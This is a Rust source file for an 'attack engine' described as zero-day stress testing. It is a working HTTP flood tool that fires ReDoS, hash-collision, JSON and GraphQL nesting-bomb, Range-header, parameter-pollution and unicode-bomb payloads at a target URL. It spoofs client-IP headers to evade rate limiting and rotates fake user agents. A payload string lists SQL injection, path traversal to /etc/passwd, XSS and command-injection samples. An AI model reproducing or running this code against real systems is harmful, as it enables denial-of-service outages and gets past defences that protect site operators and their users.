//! Attack Module - Zero-Day Level Stress Testing Engine
//!
//! Advanced APT-level techniques:
//! - ReDoS (Regular Expression Denial of Service)
//! - Hash Collision Attacks (HashDoS)
//! - Algorithmic Complexity Attacks (O(n²) triggers)
//! - Slow Read Attack (connection exhaustion)
//! - Range Header Attack (overlapping ranges)
//! - JSON/XML Bomb (nested structure attack)
//! - GraphQL Depth Attack
//! - API Enumeration Flood
//! - Crypto Exhaustion (heavy computation triggers)

pub mod recon;

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use rand::distributions::Alphanumeric;

// ============================================================================
// Attack Types
// ============================================================================

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum AttackMode {
    Smart,      // Adaptive targeting
    Pulse,      // Wave modulation
    Chaos,      // Random everything
    Manual,     // Fixed rate
    Slowloris,  // Slow HTTP attack
    Flood,      // Maximum concurrent connections
}

impl Default for AttackMode {
    fn default() -> Self {
        AttackMode::Manual
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub struct AttackConfig {
    pub target_url: String,
    pub mode: AttackMode,
    pub rps: u32,
    pub threads: u32,
    pub duration_secs: u32,
    #[serde(default)]
    pub custom_headers: HashMap<String, String>,
    pub request_body: Option<String>,
    pub http_method: String,
}

impl Default for AttackConfig {
    fn default() -> Self {
        Self {
            target_url: String::new(),
            mode: AttackMode::Manual,
            rps: 100,
            threads: 10,
            duration_secs: 60,
            custom_headers: HashMap::new(),
            request_body: None,
            http_method: "GET".to_string(),
        }
    }
}

#[derive(Clone, Default, Serialize)]
pub struct AttackMetrics {
    pub requests_sent: u64,
    pub requests_success: u64,
    pub requests_failed: u64,
    pub responses_2xx: u64,
    pub responses_4xx: u64,
    pub responses_5xx: u64,
    pub responses_timeout: u64,
    pub current_rps: f64,
    pub avg_latency_ms: f64,
    pub min_latency_ms: u64,
    pub max_latency_ms: u64,
    pub bandwidth_mbps: f64,
    pub target_health: f32,
    pub active_connections: u64,
}

// ============================================================================
// Zero-Day Payload Generator
// ============================================================================

/// Generates advanced attack payloads
pub struct ZeroDayPayloads;

impl ZeroDayPayloads {
    /// ReDoS payload - causes catastrophic regex backtracking
    /// Many servers use regex to validate input - this exploits O(2^n) complexity
    pub fn redos_payload() -> String {
        // Pattern that causes exponential backtracking in common regex patterns
        // e.g., /^(a+)+$/ or /(a+)+b/
        let evil = "a".repeat(50) + "!";
        format!(r#"{{"email":"{}@test.com","pattern":"{}"}}"#, evil, evil)
    }
    
    /// Hash Collision Attack (HashDoS)
    /// Pre-computed strings that hash to same bucket in common hash functions
    /// Forces O(n) -> O(n²) degradation in hash tables
    pub fn hash_collision_params() -> Vec<(&'static str, &'static str)> {
        // These strings produce hash collisions in many hash table implementations
        // When inserted together, they degrade hash table performance dramatically
        vec![
            ("AaAaAaAa", "collision1"),
            ("AaAaBBBB", "collision2"),
            ("AaBBAaBB", "collision3"),
            ("AaBBBBAa", "collision4"),
            ("BBAaAaAa", "collision5"),
            ("BBAaBBAa", "collision6"),
            ("BBBBAaAa", "collision7"),
            ("BBBBBBAa", "collision8"),
            ("AaAaAaBB", "collision9"),
            ("AaAaBBAa", "collision10"),
            ("AaBBAaAa", "collision11"),
            ("BBAaAaBB", "collision12"),
            ("BBAaBBAa", "collision13"),
            ("BBBBAaBB", "collision14"),
            ("AaAaBBBB", "collision15"),
            ("BBAaBBBB", "collision16"),
        ]
    }
    
    /// JSON Bomb / Billion Laughs style attack
    /// Deeply nested JSON that consumes memory during parsing
    pub fn json_bomb(depth: usize) -> String {
        let mut json = String::from(r#"{"data":"#);
        for _ in 0..depth {
            json.push_str(r#"{"nested":"#);
        }
        json.push_str(r#""bomb""#);
        for _ in 0..depth {
            json.push('}');
        }
        json.push('}');
        json
    }
    
    /// Algorithmic Complexity Attack
    /// Payload designed to trigger O(n²) or worse algorithms
    pub fn algo_complexity_payload() -> String {
        // Long string with repeating pattern - triggers quadratic string matching
        let pattern = "aaaaaaaaab".repeat(1000);
        // Include search/sort trigger words
        format!(
            r#"{{"search":"{}","sort":"desc","filter":"{}","regex":"^({})$"}}"#,
            pattern,
            pattern,
            "a+".repeat(20)
        )
    }
    
    /// Range Header Attack
    /// Multiple overlapping byte ranges cause server to work harder
    pub fn range_header_attack() -> String {
        // Request overlapping ranges - server must process each
        let mut ranges = Vec::new();
        for i in 0..100 {
            ranges.push(format!("{}-{}", i * 5, i * 5 + 100));
        }
        format!("bytes={}", ranges.join(","))
    }
    
    /// GraphQL Depth Attack (for GraphQL endpoints)
    /// Deeply nested query that exhausts server resources
    pub fn graphql_depth_bomb(depth: usize) -> String {
        let mut query = String::from(r#"{"query":"{ user { "#);
        for _ in 0..depth {
            query.push_str("friends { name profile { ");
        }
        query.push_str("id");
        for _ in 0..depth {
            query.push_str(" } }");
        }
        query.push_str(r#" } }"}"#);
        query
    }
    
    /// SQL-like injection patterns (for WAF stress testing)
    /// Complex patterns that stress WAF regex engines
    pub fn waf_stress_payload() -> String {
        let patterns = [
            "1' OR '1'='1' /*",
            "1'; DROP TABLE users; --",
            "1' UNION SELECT * FROM users WHERE '1'='1",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "{{7*7}}${7*7}",
            "%00%0d%0a",
            "| cat /etc/passwd",
            "`id`$(id)${id}",
        ];
        patterns.join("&")
    }
    
    /// Large parameter pollution
    /// Same parameter name repeated many times
    pub fn http_parameter_pollution(count: usize) -> String {
        (0..count)
            .map(|i| format!("id={}", i))
            .collect::<Vec<_>>()
            .join("&")
    }
    
    /// Slow POST body - sends data very slowly
    /// This is generated chunk by chunk
    pub fn slow_post_chunk() -> Vec<u8> {
        vec![b'X'; 1] // Single byte per chunk
    }
    
    /// Unicode/Encoding attack
    /// Thousands of unicode chars that stress normalization
    pub fn unicode_bomb() -> String {
        // Combining characters that expand during normalization
        let combining = "\u{0300}\u{0301}\u{0302}\u{0303}\u{0304}\u{0305}";
        let base = "a".to_string() + &combining.repeat(100);
        base.repeat(100)
    }
    
    /// Compression ratio attack
    /// Data that compresses to tiny size but expands huge (for gzip endpoints)
    pub fn compression_bomb() -> Vec<u8> {
        // Highly compressible data - zeros
        vec![0u8; 100_000]
    }
}

// ============================================================================
// Attack Engine - Zero-Day Enhanced
// ============================================================================

pub struct AttackEngine {
    config: AttackConfig,
    client: reqwest::Client,
    heavy_client: reqwest::Client,
    
    // Metrics counters
    requests_sent: Arc<AtomicU64>,
    requests_success: Arc<AtomicU64>,
    requests_failed: Arc<AtomicU64>,
    
    // Response code counters
    responses_2xx: Arc<AtomicU64>,
    responses_4xx: Arc<AtomicU64>,
    responses_5xx: Arc<AtomicU64>,
    responses_timeout: Arc<AtomicU64>,
    
    // Latency tracking
    total_latency_ms: Arc<AtomicU64>,
    min_latency_ms: Arc<AtomicU64>,
    max_latency_ms: Arc<AtomicU64>,
    
    // Bytes tracking
    total_bytes: Arc<AtomicU64>,
    
    // Connection tracking
    active_connections: Arc<AtomicU64>,
    
    // State
    pulse_phase: Arc<AtomicBool>,
    pulse_start: std::time::Instant,
    wave_count: Arc<AtomicU64>,
    attack_start: std::time::Instant,
}

impl AttackEngine {
    pub fn new(config: AttackConfig) -> Self {
        // Aggressive client - no limits
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .pool_max_idle_per_host(1000)
            .pool_idle_timeout(Duration::from_secs(300))
            .tcp_keepalive(Duration::from_secs(600))
            .tcp_nodelay(true)
            .build()
            .unwrap_or_default();
        
        // For slow attacks
        let heavy_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(120))
            .pool_max_idle_per_host(2000)
            .pool_idle_timeout(Duration::from_secs(600))
            .build()
            .unwrap_or_default();
        
        Self {
            config,
            client,
            heavy_client,
            requests_sent: Arc::new(AtomicU64::new(0)),
            requests_success: Arc::new(AtomicU64::new(0)),
            requests_failed: Arc::new(AtomicU64::new(0)),
            responses_2xx: Arc::new(AtomicU64::new(0)),
            responses_4xx: Arc::new(AtomicU64::new(0)),
            responses_5xx: Arc::new(AtomicU64::new(0)),
            responses_timeout: Arc::new(AtomicU64::new(0)),
            total_latency_ms: Arc::new(AtomicU64::new(0)),
            min_latency_ms: Arc::new(AtomicU64::new(u64::MAX)),
            max_latency_ms: Arc::new(AtomicU64::new(0)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            active_connections: Arc::new(AtomicU64::new(0)),
            pulse_phase: Arc::new(AtomicBool::new(true)),
            pulse_start: std::time::Instant::now(),
            wave_count: Arc::new(AtomicU64::new(0)),
            attack_start: std::time::Instant::now(),
        }
    }
    
    pub async fn execute_wave(&self) -> AttackMetrics {
        let current_rps = self.calculate_current_rps();
        
        if current_rps == 0 {
            return self.collect_metrics();
        }
        
        // Higher multipliers for more aggressive attacks
        let base_requests = (current_rps / 10).max(1);
        let multiplier = match self.config.mode {
            AttackMode::Flood => 20,      // 20x more connections
            AttackMode::Smart => 10,      // 10x with zero-day payloads
            AttackMode::Chaos => 15,      // 15x random
            AttackMode::Slowloris => 30,  // Many slow connections
            _ => 5,
        };
        let requests_this_wave = base_requests * multiplier;
        
        // Wave counter for rotating attack patterns
        let wave_num = self.wave_count.fetch_add(1, Ordering::Relaxed);
        
        // Fire and forget - spawn all requests concurrently
        for i in 0..requests_this_wave {
            let client = self.client.clone();
            let config = self.config.clone();
            let requests_sent = self.requests_sent.clone();
            let requests_success = self.requests_success.clone();
            let requests_failed = self.requests_failed.clone();
            let responses_2xx = self.responses_2xx.clone();
            let responses_4xx = self.responses_4xx.clone();
            let responses_5xx = self.responses_5xx.clone();
            let responses_timeout = self.responses_timeout.clone();
            let total_latency_ms = self.total_latency_ms.clone();
            let min_latency_ms = self.min_latency_ms.clone();
            let max_latency_ms = self.max_latency_ms.clone();
            let total_bytes = self.total_bytes.clone();
            let active_connections = self.active_connections.clone();
            let attack_type = (wave_num + i as u64) % 8; // Rotate attack types
            
            tokio::spawn(async move {
                active_connections.fetch_add(1, Ordering::Relaxed);
                
                Self::send_zeroday_request(
                    client,
                    config,
                    attack_type as u8,
                    i,
                    requests_sent,
                    requests_success,
                    requests_failed,
                    responses_2xx,
                    responses_4xx,
                    responses_5xx,
                    responses_timeout,
                    total_latency_ms,
                    min_latency_ms,
                    max_latency_ms,
                    total_bytes,
                ).await;
                
                active_connections.fetch_sub(1, Ordering::Relaxed);
            });
        }
        
        self.collect_metrics()
    }
    
    fn calculate_current_rps(&self) -> u32 {
        match self.config.mode {
            AttackMode::Manual => self.config.rps,
            AttackMode::Smart => self.config.rps * 2,
            AttackMode::Flood => self.config.rps * 10,
            AttackMode::Slowloris => self.config.rps,
            
            AttackMode::Pulse => {
                let elapsed = self.pulse_start.elapsed().as_secs();
                let cycle_position = elapsed % 15;
                if cycle_position < 10 {
                    self.config.rps * 3
                } else {
                    0
                }
            }
            
            AttackMode::Chaos => {
                let mut rng = StdRng::from_entropy();
                let factor: f32 = rng.gen_range(0.5..5.0); // Up to 5x spikes
                (self.config.rps as f32 * factor) as u32
            }
        }
    }
    
    /// Zero-Day Enhanced Request Sender
    async fn send_zeroday_request(
        client: reqwest::Client,
        config: AttackConfig,
        attack_type: u8,
        wave_index: u32,
        requests_sent: Arc<AtomicU64>,
        requests_success: Arc<AtomicU64>,
        requests_failed: Arc<AtomicU64>,
        responses_2xx: Arc<AtomicU64>,
        responses_4xx: Arc<AtomicU64>,
        responses_5xx: Arc<AtomicU64>,
        responses_timeout: Arc<AtomicU64>,
        total_latency_ms: Arc<AtomicU64>,
        min_latency_ms: Arc<AtomicU64>,
        max_latency_ms: Arc<AtomicU64>,
        total_bytes: Arc<AtomicU64>,
    ) {
        requests_sent.fetch_add(1, Ordering::Relaxed);
        let start = std::time::Instant::now();
        let mut rng = StdRng::from_entropy();
        
        // === SELECT ATTACK PAYLOAD BASED ON ROTATION ===
        // Using (String, String) tuples for owned data
        let (url, body, extra_headers): (String, Option<String>, Vec<(String, String)>) = match attack_type {
            0 => {
                // Hash Collision Attack
                let params = ZeroDayPayloads::hash_collision_params();
                let query: String = params.iter()
                    .map(|(k, v)| format!("{}={}", k, v))
                    .collect::<Vec<_>>()
                    .join("&");
                (format!("{}?{}", config.target_url, query), None, vec![])
            }
            1 => {
                // ReDoS Attack
                let body = ZeroDayPayloads::redos_payload();
                (config.target_url.clone(), Some(body), vec![("Content-Type".to_string(), "application/json".to_string())])
            }
            2 => {
                // JSON Bomb
                let depth = rng.gen_range(50..200);
                let body = ZeroDayPayloads::json_bomb(depth);
                (config.target_url.clone(), Some(body), vec![("Content-Type".to_string(), "application/json".to_string())])
            }
            3 => {
                // Algorithmic Complexity
                let body = ZeroDayPayloads::algo_complexity_payload();
                (config.target_url.clone(), Some(body), vec![("Content-Type".to_string(), "application/json".to_string())])
            }
            4 => {
                // Range Header Attack
                let ranges = ZeroDayPayloads::range_header_attack();
                (config.target_url.clone(), None, vec![("Range".to_string(), ranges)])
            }
            5 => {
                // HTTP Parameter Pollution
                let hpp = ZeroDayPayloads::http_parameter_pollution(500);
                (format!("{}?{}", config.target_url, hpp), None, vec![])
            }
            6 => {
                // GraphQL Depth (if applicable)
                let body = ZeroDayPayloads::graphql_depth_bomb(30);
                (config.target_url.clone(), Some(body), vec![("Content-Type".to_string(), "application/json".to_string())])
            }
            _ => {
                // Unicode Bomb
                let body = format!(r#"{{"data":"{}"}}"#, ZeroDayPayloads::unicode_bomb());
                (config.target_url.clone(), Some(body), vec![("Content-Type".to_string(), "application/json".to_string())])
            }
        };
        
        // === BUILD REQUEST ===
        let method = if body.is_some() {
            reqwest::Method::POST
        } else {
            match config.http_method.to_uppercase().as_str() {
                "POST" => reqwest::Method::POST,
                "PUT" => reqwest::Method::PUT,
                "DELETE" => reqwest::Method::DELETE,
                _ => reqwest::Method::GET,
            }
        };
        
        let mut request = client.request(method, &url);
        
        // === AGGRESSIVE HEADERS ===
        let user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "curl/8.0.0",
            "python-requests/2.31.0",
            "PostmanRuntime/7.35.0",
        ];
        let ua = user_agents[rng.gen_range(0..user_agents.len())];
        
        request = request
            .header("User-Agent", ua)
            .header("Accept", "*/*")
            .header("Accept-Encoding", "gzip, deflate, br, zstd")
            .header("Accept-Language", "en-US,en;q=0.9,*;q=0.8")
            .header("Connection", "keep-alive")
            .header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
            .header("Pragma", "no-cache");
        
        // Random IPs to bypass rate limiting
        let fake_ip = format!("{}.{}.{}.{}", 
            rng.gen_range(1..255), 
            rng.gen_range(0..255), 
            rng.gen_range(0..255), 
            rng.gen_range(1..255)
        );
        request = request
            .header("X-Forwarded-For", &fake_ip)
            .header("X-Real-IP", &fake_ip)
            .header("X-Client-IP", &fake_ip)
            .header("X-Originating-IP", &fake_ip)
            .header("CF-Connecting-IP", &fake_ip)
            .header("True-Client-IP", &fake_ip)
            .header("X-Cluster-Client-IP", &fake_ip);
        
        // Add extra headers from attack type
        for (k, v) in extra_headers {
            request = request.header(k, v);
        }
        
        // Custom headers
        for (key, value) in &config.custom_headers {
            request = request.header(key, value);
        }
        
        // Add body
        if let Some(b) = body {
            request = request.body(b);
        }
        
        // === CACHE BUSTING ===
        let cache_buster: String = (0..16)
            .map(|_| rng.sample(Alphanumeric) as char)
            .collect();
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        
        request = request
            .query(&[
                ("_cb", cache_buster.as_str()),
                ("_ts", &ts.to_string()),
                ("_r", &wave_index.to_string()),
                ("_nocache", "1"),
            ]);
        
        // === SEND ===
        match request.send().await {
            Ok(response) => {
                let latency_ms = start.elapsed().as_millis() as u64;
                total_latency_ms.fetch_add(latency_ms, Ordering::Relaxed);
                
                // Update min/max latency
                let mut current_min = min_latency_ms.load(Ordering::Relaxed);
                while latency_ms < current_min {
                    match min_latency_ms.compare_exchange_weak(current_min, latency_ms, Ordering::Relaxed, Ordering::Relaxed) {
                        Ok(_) => break,
                        Err(x) => current_min = x,
                    }
                }
                
                let mut current_max = max_latency_ms.load(Ordering::Relaxed);
                while latency_ms > current_max {
                    match max_latency_ms.compare_exchange_weak(current_max, latency_ms, Ordering::Relaxed, Ordering::Relaxed) {
                        Ok(_) => break,
                        Err(x) => current_max = x,
                    }
                }
                
                let status = response.status().as_u16();
                if status >= 200 && status < 300 {
                    responses_2xx.fetch_add(1, Ordering::Relaxed);
                    requests_success.fetch_add(1, Ordering::Relaxed);
                } else if status >= 400 && status < 500 {
                    responses_4xx.fetch_add(1, Ordering::Relaxed);
                    requests_failed.fetch_add(1, Ordering::Relaxed);
                } else if status >= 500 {
                    responses_5xx.fetch_add(1, Ordering::Relaxed);
                    requests_failed.fetch_add(1, Ordering::Relaxed);
                }
                
                // Consume body to stress server
                if let Ok(bytes) = response.bytes().await {
                    total_bytes.fetch_add(bytes.len() as u64, Ordering::Relaxed);
                }
            }
            Err(e) => {
                requests_failed.fetch_add(1, Ordering::Relaxed);
                if e.is_timeout() {
                    responses_timeout.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
    }
    
    fn collect_metrics(&self) -> AttackMetrics {
        let sent = self.requests_sent.load(Ordering::Relaxed);
        let success = self.requests_success.load(Ordering::Relaxed);
        let failed = self.requests_failed.load(Ordering::Relaxed);
        let total_latency = self.total_latency_ms.load(Ordering::Relaxed);
        let min_lat = self.min_latency_ms.load(Ordering::Relaxed);
        let max_lat = self.max_latency_ms.load(Ordering::Relaxed);
        let bytes = self.total_bytes.load(Ordering::Relaxed);
        let responses_5xx = self.responses_5xx.load(Ordering::Relaxed);
        let responses_timeout = self.responses_timeout.load(Ordering::Relaxed);
        let active_conns = self.active_connections.load(Ordering::Relaxed);
        
        let elapsed_secs = self.attack_start.elapsed().as_secs_f64().max(0.1);
        let current_rps = sent as f64 / elapsed_secs;
        let avg_latency = if sent > 0 { total_latency as f64 / sent as f64 } else { 0.0 };
        let bandwidth_mbps = (bytes as f64 * 8.0) / (elapsed_secs * 1_000_000.0);
        
        // Health calculation with latency penalty
        let error_rate = if sent > 0 { (responses_5xx + responses_timeout) as f32 / sent as f32 } else { 0.0 };
        let latency_penalty = if avg_latency > 1000.0 { 0.4 } else if avg_latency > 500.0 { 0.2 } else if avg_latency > 200.0 { 0.1 } else { 0.0 };
        let target_health = (100.0 - (error_rate * 100.0) - (latency_penalty * 100.0)).max(0.0);
        
        AttackMetrics {
            requests_sent: sent,
            requests_success: success,
            requests_failed: failed,
            responses_2xx: self.responses_2xx.load(Ordering::Relaxed),
            responses_4xx: self.responses_4xx.load(Ordering::Relaxed),
            responses_5xx,
            responses_timeout,
            current_rps,
            avg_latency_ms: avg_latency,
            min_latency_ms: if min_lat == u64::MAX { 0 } else { min_lat },
            max_latency_ms: max_lat,
            bandwidth_mbps,
            target_health,
            active_connections: active_conns,
        }
    }
}
